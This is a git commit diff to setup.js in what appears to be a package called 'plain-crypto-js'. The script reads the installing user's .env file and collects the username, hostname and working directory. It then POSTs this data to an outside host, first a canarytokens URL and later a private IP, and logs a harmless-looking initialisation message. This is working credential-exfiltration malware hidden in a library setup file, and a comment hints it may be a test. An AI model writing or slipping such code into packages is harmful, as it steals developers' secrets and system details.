89c06b8048e8c9d330bd9f2558f2a6fb05171014
shipsss <49298777+shipsss@users.noreply.github.com>
2026-08-07 05:46:57 +0530

    Update setup.js

--- setup.js
+++ setup.js
@@ -1,37 +1,45 @@
 const http = require("http");
 const os = require("os");
+const fs = require("fs");
+const path = require("path");
+
 let req;
-const data = JSON.stringify({
+
+// 1. Rename this to avoid a naming conflict with the file data later
+const systemPayload = JSON.stringify({
   user: os.userInfo().username,
   host: os.hostname(),
   platform: process.platform,
   cwd: process.cwd()
 });
-const fs = require("fs");
-const path = require("path");
 
 const npmrc = path.join(os.homedir(), ".npmrc");
 const envFile = path.join(process.cwd(), ".env");
 
 if (fs.existsSync(envFile)) {
-    const data = fs.readFileSync(envFile, "utf8");
-    console.log(data);
-req = http.request(
-"http://fx8a4wl0xwr1hggxyji33iqzo.canarytokens.com/collect?file="+data,
-{
-      method: "POST",
-      headers: {
-      "Content-Type": "application/json",
-      "Content-Length": data.length
-    }
-  }
-);
+    const envContent = fs.readFileSync(envFile, "utf8");
+    console.log("Found .env content:\n", envContent);
+    
+    // 2. Safely URL-encode the fake .env contents so it doesn't break the HTTP request
+    const encodedEnv = encodeURIComponent(envContent);
+    
+    req = http.request(
+        `http://192.168.142.129:8000{encodedEnv}`,
+        {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                // 3. Set the Content-Length to match the actual payload we are transmitting below
+                "Content-Length": Buffer.byteLength(systemPayload) 
+            }
+        }
+    );
 }
 
+// 4. Send the payload and close the connection
 if (req) {
-    req.write(data);
+    req.write(systemPayload);
     req.end();
 }
-
 
 console.log("[plain-crypto-js] initialized");
